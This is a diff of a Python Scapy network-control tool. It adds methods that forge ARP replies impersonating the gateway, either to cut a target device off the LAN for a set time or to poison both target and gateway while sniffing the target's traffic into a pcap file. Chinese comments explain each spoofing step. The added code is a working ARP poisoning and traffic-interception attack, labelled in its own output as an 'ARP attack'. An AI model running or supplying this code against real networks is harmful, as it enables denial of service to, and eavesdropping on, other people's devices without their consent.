@@ -1,17 +1,16 @@
 # -*- coding:utf-8 -*-
 from scapy.all import *
 from utils import active_host, get_hostname_by_ip, load_rules,start_sniff_arp,\
-    poison_target,restore_target,cut_target,get_mac,start_sniff
+    restore_target,get_mac
 
 from web import socketio,app
 from host import Host
 import json
 import time
-import os
-import sys
-import threading
-import signal
 from job import Job
+
+
+
 
 import logging
 logger = logging.getLogger('nct')
@@ -21,6 +20,8 @@ GATEWAY_MAC = app.config['GATEWAY_MAC']
 COUNT = app.config['PACKET_COUNT']
 TIME = app.config['TIME']
 
+LOCK_LISTEN = True
+LOCK_CUT = True
 
 class Nct():
     def __init__(self,ip_section = "192.168.1.*",mode = 1):
@@ -82,16 +83,49 @@ class Nct():
                 self.hosts.append(Host(host[0], host[1], '不在白名单中'))
                 logger.info("ip {0}: is not in rules ,ip is {1}".format(host[0],host[1]))
 
+    def cut_target(self,gateway_ip, gateway_mac, target_ip, target_mac):
+        # 构建欺骗目标的ARP请求()，这里没设置hwsrc,默认就是本机咯
+        # 简单来说：告诉被攻击机器，本机（攻击机）的mac是网关，就是攻击者的机器是网关
+        poison_target = ARP()
+        poison_target.op = 2  # 响应报文
+        poison_target.psrc = gateway_ip  # 模拟是网关发出的, 其实是我们的机器发出的
+        poison_target.pdst = target_ip  # 目的地是目标机器
+        poison_target.hwdst = target_mac  # 目标的物理地址是目标机器的mac
 
+        # 构建欺骗网关的ARP请求()，这里没设置hwsrc,默认就是本机咯
+        poison_gateway = ARP()
+        poison_gateway.op = 2  # 响应报文
+        poison_gateway.psrc = target_ip  # 模拟是目标机器发出的,
+        poison_gateway.pdst = gateway_ip  # 目的地是网关
+        poison_gateway.hwdst = gateway_mac  # 目标的物理地址是网关的mac
+
+        print "[*] Beginning the ARP attack. ［CTRL_C to stop］"
+
+        while LOCK_CUT:
+            try:
+                # 开始发送ARP欺骗包(投毒)
+                send(poison_target)
+                #send(poison_gateway)
+                # 停两秒
+                print "send packet!"
+                time.sleep(2)
+            except KeyboardInterrupt:
+                restore_target(gateway_ip, gateway_mac, target_ip, target_mac)
+
+        print "[*] ARP poison attack finished"
+        return
 
     def cut_it(self,target_ip,target_mac):
-        #conf.verb = 0
-        cut_thread = Job(target=cut_target, args=(GATEWAY, GATEWAY_MAC, target_ip, target_mac))
+        conf.verb = 0
+        cut_thread = Job(target=self.cut_target, args=(GATEWAY, GATEWAY_MAC, target_ip, target_mac))
         cut_thread.setDaemon(True)
         cut_thread.start()
         try:
             print "[*] Starting attack  {} mac:{}".format(target_ip,target_mac)
             time.sleep(TIME)#断网十分钟
+
+            global LOCK_CUT
+            LOCK_CUT = False
             cut_thread.stop()
 
             # 还原网络配置
@@ -144,11 +178,44 @@ class Nct():
         #packet.show()
         pass
 
+    def poison_target(self,gateway_ip, gateway_mac, target_ip, target_mac):
+
+        # 构建欺骗目标的ARP请求()，这里没设置hwsrc,默认就是本机咯
+        # 简单来说：告诉被攻击机器，本机（攻击机）的mac是网关，就是攻击者的机器是网关
+        poison_target = ARP()
+        poison_target.op = 2  # 响应报文
+        poison_target.psrc = gateway_ip  # 模拟是网关发出的, 其实是我们的机器发出的
+        poison_target.pdst = target_ip  # 目的地是目标机器
+        poison_target.hwdst = target_mac  # 目标的物理地址是目标机器的mac
+
+        # 构建欺骗网关的ARP请求()，这里没设置hwsrc,默认就是本机咯
+        poison_gateway = ARP()
+        poison_gateway.op = 2  # 响应报文
+        poison_gateway.psrc = target_ip  # 模拟是目标机器发出的,
+        poison_gateway.pdst = gateway_ip  # 目的地是网关
+        poison_gateway.hwdst = gateway_mac  # 目标的物理地址是网关的mac
+
+        print "[*] Beginning the ARP poison. ［CTRL_C to stop］"
+
+        while LOCK_LISTEN:
+            try:
+                print 'send arp packet'
+                # 开始发送ARP欺骗包(投毒)
+                send(poison_target)
+                send(poison_gateway)
+                # 停两秒
+                time.sleep(2)
+            except KeyboardInterrupt:
+                restore_target(gateway_ip, gateway_mac, target_ip, target_mac)
+
+        print "[*] ARP poison attack finished"
+        return
+
     def listen(self,target_ip,target_mac):
-        #conf.verb = 0
+        conf.verb = 0
         GATEWAY_MAC = get_mac(GATEWAY)
         packet_count = COUNT
-        poison_thread = Job(target=poison_target, args=(GATEWAY, GATEWAY_MAC, target_ip, target_mac))
+        poison_thread = Job(target=self.poison_target, args=(GATEWAY, GATEWAY_MAC, target_ip, target_mac))
         poison_thread.setDaemon(True)
         poison_thread.start()
         try:
@@ -161,6 +228,9 @@ class Nct():
             packets = sniff(count=packet_count, filter=bpf_filter,prn=self.stop_sniff)#,stopper = self.stop_sniff(),stopper_timeout=1)
             #time.sleep(5)
             # 将捕获到的数据包输出到文件
+
+            global LOCK_LISTEN
+            LOCK_LISTEN = False
             poison_thread.stop()
             #sniff_thread.stop()
             wrpcap('{}.pcap'.format(target_ip), packets)
@@ -189,27 +259,12 @@ class Nct():
 
 
 
-    def test(self):
-        t = Job(target=self.mythread,args=(1,2))
-        t.setDaemon(True)
-        #t.join()
-        t.start()
-        print 'here'
-        time.sleep(5)
-        print t
-        t.stop()
-        #os.kill(os.getpid(), signal.SIGINT)
 
-    def mythread(self,a,b):
-        while True:
-            print 'mythread'
-            #print time.time()
-            time.sleep(1)
+
+
 
 if __name__ == '__main__':
     nct = Nct()
     #nct.cut_it('192.168.1.101','64:9a:be:8d:d7:24')
     #nct.listen('192.168.1.101','64:9a:be:8d:d7:24')
     #list = nct.refresh_list()
-    #nct.start_service()
-    nct.test()
